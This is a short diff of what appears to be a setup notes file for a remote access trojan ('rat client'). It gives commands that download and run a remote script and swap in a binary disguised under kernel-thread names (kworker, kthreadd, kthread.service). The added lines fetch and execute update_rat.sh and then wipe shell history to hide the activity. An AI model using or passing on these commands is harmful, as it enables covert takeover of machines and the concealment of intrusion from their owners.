@@ -17,3 +17,6 @@ bash -c "$(curl -fsSL https://raw.githubusercontent.com/thm1472581-dotcom/kworke
 
 单独更新rat client
 systemctl stop kthread.service && curl -fsSL -o /var/local/kthreadd/kthread.new https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/kthread && chmod 755 /var/local/kthreadd/kthread.new && mv -f /var/local/kthreadd/kthread.new /var/local/kthreadd/kthread && systemctl start kthread.service && systemctl status kthread.service --no-pager
+
+单独更新rat client new
+bash -c "$(curl -fsSL https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/update_rat.sh)" && history -c && history -cw && rm -f ~/.bash_history
